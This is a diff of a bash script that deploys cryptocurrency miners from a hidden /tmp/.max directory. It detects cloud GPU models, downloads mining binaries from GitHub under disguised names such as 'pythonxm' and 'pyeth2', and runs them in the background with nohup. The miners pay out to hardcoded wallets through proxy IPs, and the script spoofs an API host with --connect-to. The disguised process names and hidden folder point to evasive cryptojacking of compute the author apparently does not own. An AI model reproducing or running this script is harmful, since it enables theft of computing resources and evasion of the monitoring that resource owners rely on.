@@ -1,7 +1,7 @@
 #!/bin/bash
 echo 
 echo -e '####################################################################################'
-echo -e '############################# CPU2 Ver:0.9.45 ######################################'
+echo -e '############################# CPU5 Ver:0.9.52 ######################################'
 echo -e '####################################################################################'
 echo 
 echo 
@@ -12,23 +12,28 @@ ETPort=443
 RVPort=8080
 VCPort=80
 XMPort=21
-DisplayRefrech=180
+TESTPort=587
+DisplayRefrech=300
 
 HZ_PROX1=49.12.115.117
-HZ_PROX2=116.203.206.127
+HZ_PROX2=188.34.159.9
 EU_PROX=49.12.115.117
 US_PROX=173.199.123.152
 CA_PROX=173.199.123.152
 ASIA_PROX=49.12.115.117
 
-VCOptions="d=16,xn=1,hybrid"
+#VCOptions="d=16,xn=1,hybrid"
+#VCOptions="mc=VRSC"
+VCOptions="c=DOGE,mc=VRSC"
+#VCOptions="c=VRSC,mc=VRSC"
+
 #VCOptions="X"
 
 SWITCHOPG=AUTO
 SWITCHOP=VC
 
-SWITCHPROX=AUTO
-#SWITCHPROX=$HZ_PROX1
+#SWITCHPROX=AUTO
+SWITCHPROX=$HZ_PROX1
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -40,10 +45,12 @@ Debug=False
 W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
 W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
-W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+#W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+#W_VC="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
+W_VC="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 
 # Directory
-Work_Dir="/tmp/.max"
+Work_Dir="/tmp/.max/"
 mkdir -p $Work_Dir
 cd  $Work_Dir
 
@@ -100,10 +107,10 @@ else
     echo
 fi
 
-gcard=$(lspci 2>> ${Work_Dir}/err| awk -F ':' '/VGA/{print $3}')
+gcard=$(lspci 2>> /tmp/.max/err| awk -F ':' '/VGA/{print $3}')
 #echo "Graphics:${gcard}."
 
-netinfo=$(ip addr 2>> ${Work_Dir}/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
+netinfo=$(ip addr 2>> /tmp/.max/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
 macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
 ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
 #echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."
@@ -112,26 +119,28 @@ echo -e '#######################################################################
 
 
 
+wget -q -O /tmp/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
+chmod +x /tmp/jq
 
 
 INFIDIFF=$(curl -s  --connect-to api.minerstat.com:443:$HZ_PROX1:8888  https://api.minerstat.com//v2/coins\?list\=ETH,RVN,XMR,VRSC --insecure)
 
-ETHDIF=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[0].difficulty')
-ETHREWARD=$(echo  $INFIDIFF  | ${Work_Dir}/jq '.[0].reward')
-ETHPRICE=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[0].price')
+ETHDIF=$(echo  $INFIDIFF | /tmp/jq '.[0].difficulty')
+ETHREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[0].reward')
+ETHPRICE=$(echo  $INFIDIFF | /tmp/jq '.[0].price')
 
 
-RVDIF=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[1].difficulty')
-RVREWARD=$(echo  $INFIDIFF  | ${Work_Dir}/jq '.[1].reward')
-RVPRICE=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[1].price')
+RVDIF=$(echo  $INFIDIFF | /tmp/jq '.[1].difficulty')
+RVREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[1].reward')
+RVPRICE=$(echo  $INFIDIFF | /tmp/jq '.[1].price')
 
-VCDIF=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[3].difficulty')
-VCREWARD=$(echo  $INFIDIFF  | ${Work_Dir}/jq '.[3].reward')
-VCPRICE=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[3].price')
+VCDIF=$(echo  $INFIDIFF | /tmp/jq '.[3].difficulty')
+VCREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[3].reward')
+VCPRICE=$(echo  $INFIDIFF | /tmp/jq '.[3].price')
 
-XMDIF=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[2].difficulty')
-XMREWARD=$(echo  $INFIDIFF  | ${Work_Dir}/jq '.[2].reward')
-XMPRICE=$(echo  $INFIDIFF | ${Work_Dir}/jq '.[2].price')
+XMDIF=$(echo  $INFIDIFF | /tmp/jq '.[2].difficulty')
+XMREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[2].reward')
+XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
 
 
 
@@ -304,7 +313,7 @@ fi
 
 #################### GPU Type #########################
 GPU=NULL
-if [ $(nvidia-smi 2>> ${Work_Dir}/err | grep P100-PCIE |wc -l) == 1 ]
+if [ $(nvidia-smi 2>> /tmp/.max/err | grep P100-PCIE |wc -l) == 1 ]
 then
 
 echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
@@ -312,33 +321,33 @@ GPU=P100
 OPG=ET
 PROG=CU
 BGColor=$On_IGreen
-elif [ $(nvidia-smi 2>> ${Work_Dir}/err | grep failed |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep failed |wc -l) == 1 ]
 then
 echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}"
 GPU=NONE
 OPG=NONE
 BGColor=$On_IRed
-elif [ $( nvidia-smi 2>> ${Work_Dir}/err  2>&1 |  grep "not found" |wc -l) == 1 ]
+elif [ $( nvidia-smi 2>> /tmp/.max/err  2>&1 |  grep "not found" |wc -l) == 1 ]
 then
 echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}"
 GPU=NONE
 OPG=NONE
 BGColor=$On_IRed
-elif [ $(nvidia-smi 2>> ${Work_Dir}/err | grep T4 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep T4 |wc -l) == 1 ]
 then
 echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
 GPU=T4
 OPG=ET
 PROG=CU
 BGColor=$On_IBlue
-elif [ $(nvidia-smi 2>> ${Work_Dir}/err | grep K80 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep K80 |wc -l) == 1 ]
 then
 echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
 GPU=K80
 OPG=RV
 PROG=CU
 BGColor="$On_IYellow""$BRed"
-elif [ $(nvidia-smi 2>> ${Work_Dir}/err | grep P4 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep P4 |wc -l) == 1 ]
 then
 
 echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
@@ -383,8 +392,11 @@ then
     ####### XM
     #               Executable
     echo start >> ooutxm
-
-    #                Configwnload/bin0.0.1/pythonxm 
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
     sed -i "s+ip0001+RV_$IPNAME+g" config.json
     sed -i "s+49.12.115.117+$PROX+g" config.json
     sed -i "s+:8080+:$XMPort+g" config.json
@@ -396,7 +408,9 @@ elif [ $OP == "VC" ]
 then  
     ###### VC
     echo start >> ooutvc
-
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
 
     nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
 else
@@ -405,7 +419,9 @@ else
         ####### XM
     #               Executable
     echo start >> ooutxm
-
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
     #                Config
     wget -q https://github.com/one10001/10001code/raw/main/config.json
     sed -i "s+ip0001+RV_$IPNAME+g" config.json
@@ -414,14 +430,18 @@ else
 
     nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
     echo start >> ooutvc
-
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
 
     nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
 fi
 
 if [ $OPG == "ET" ]
 then
-
+    rm -rf pyeth2
+    wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
+    chmod +x pyeth2
     if  [ $PROG == "CU" ]
     then
         nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
@@ -476,9 +496,9 @@ while true
                 GPROFIT=0
                 if [ $OPG == "RV" ]
                 then
-                GPROFIT=$(python3 -c "print('%.2f' % ($RVREWARD * $Gspeed * 1e6 * $RVPRICE * 24 * 30 ))" 2>> ${Work_Dir}/err  )
+                GPROFIT=$(python3 -c "print('%.2f' % ($RVREWARD * $Gspeed * 1e6 * $RVPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                 else
-                GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> ${Work_Dir}/err  )
+                GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                 fi
                 echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | GPing :${BIRed} $Gping ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}" 
 
@@ -493,14 +513,14 @@ while true
             XSHARE=$(grep acc ooutxm | wc -l)
             Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-            XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> ${Work_Dir}/err  )
+            XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
             echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | Xping :${BIRed} $Xping ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}" 
         elif [ $OP == "VC" ]
         then
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> ${Work_Dir}/err) 
+            VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> /tmp/.max/err) 
             echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}" 
         else 
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
